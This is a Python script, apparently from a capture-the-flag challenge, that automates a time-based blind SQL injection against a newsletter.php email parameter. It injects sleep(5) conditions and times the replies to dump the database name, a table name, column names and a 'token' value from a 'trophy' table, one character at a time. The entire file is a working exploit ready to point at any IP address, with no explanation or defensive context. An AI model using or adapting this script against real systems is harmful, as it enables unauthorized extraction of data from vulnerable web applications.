import requests
import sys
import time

#Send the payload to the vulnerable parameter on the target host
#If it take 5 seconds or longer to get a reply -> true response
def send_payload(ip, payload):
	start = time.time()
	r = requests.get("http://"+ip+"/newsletter.php?name=test&email=test' OR IF(%s, sleep(5), 'NO') AND '1'='1" %payload)
	end = time.time()
	if end-start >=5:
		return True
	else:
		return False

#Brute-force the length of the database
#Iterate to all possible letters and brute-force the name of the database
def brute_db(ip):
	length = 0
	for i in range(0,100):
		if send_payload(ip,  "LENGTH(DATABASE())='%d'" %i):
			length=i
			break
	print("Length: %d" %length)
	sys.stdout.write("Dumping: ")
	sys.stdout.flush()

	db_name=""
	for i in range(1, length+1):
		for j in range(96,123):
			if send_payload(ip,  "SUBSTRING(DATABASE(),%d,1)='%s'" %(i, chr(j))):
				db_name += chr(j)
				sys.stdout.write (chr(j))
				sys.stdout.flush()
	sys.stdout.write("\n")
	sys.stdout.flush()
	return db_name

def brute_table(ip):
	length = 0
	for i in range(0,100):
		if send_payload(ip,  "LENGTH((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1))='%d'" %i):
			length=i
			break
	print("Length: %d" %length)
	sys.stdout.write("Dumping: ")
	sys.stdout.flush()

	table_name=""
	for i in range(1, length+1):
		for j in range(96,123):
			if send_payload(ip,  "SUBSTRING((SELECT table_name from information_schema.tables where table_schema=DATABASE() limit 0,1),%d,1)='%s'" %(i, chr(j))):
				table_name += chr(j)
				sys.stdout.write (chr(j))
				sys.stdout.flush()
	sys.stdout.write("\n")
	sys.stdout.flush()
	return table_name

def brute_column(ip):
	length = 0
	for i in range(0,100):
		if send_payload(ip,  "LENGTH((SELECT column_name from information_schema.columns where table_name='trophy' limit 0,1))='%d'" %i):
			length=i
			break
	print("Length: %d" %length)
	sys.stdout.write("Dumping: ")
	sys.stdout.flush()

	column_name=""
	for i in range(1, length+1):
		for j in range(96,123):
			if send_payload(ip,  "SUBSTRING((SELECT column_name from information_schema.columns where table_name='trophy' limit 0,1),%d,1)='%s'" %(i, chr(j))):
				column_name += chr(j)
				sys.stdout.write (chr(j))
				sys.stdout.flush()
	sys.stdout.write("\n")
	sys.stdout.flush()
	return column_name

def brute_data(ip):
	length = 0
	for i in range(0,100):
		if send_payload(ip,  "LENGTH((SELECT token FROM trophy limit 0,1))='%d'" %i):
			length=i
			break
	print("Length: %d" %length)
	sys.stdout.write("Dumping: ")
	sys.stdout.flush()

	column_name=""
	for i in range(1, length+1):
		for j in range(48,123):
			if send_payload(ip,  "SUBSTRING((SELECT token FROM trophy limit 0,1),%d,1)='%s'" %(i, chr(j))):
				column_name += chr(j)
				sys.stdout.write (chr(j))
				sys.stdout.flush()
	sys.stdout.write("\n")
	sys.stdout.flush()
	return column_name

def main():
	if len(sys.argv) !=2:
		print ("Usage: python %s <ip>" %(sys.argv[0]))
		sys.exit(1)
	ip = sys.argv[1]
	#test = brute_db(ip)
	#print ("DB name: %s" %test)
	#print ("Table name: %s" %brute_table(ip))
	#print ("Column name: %s" %brute_column(ip))
	print ("Data: %s" %brute_data(ip))

if __name__=="__main__":
	main()
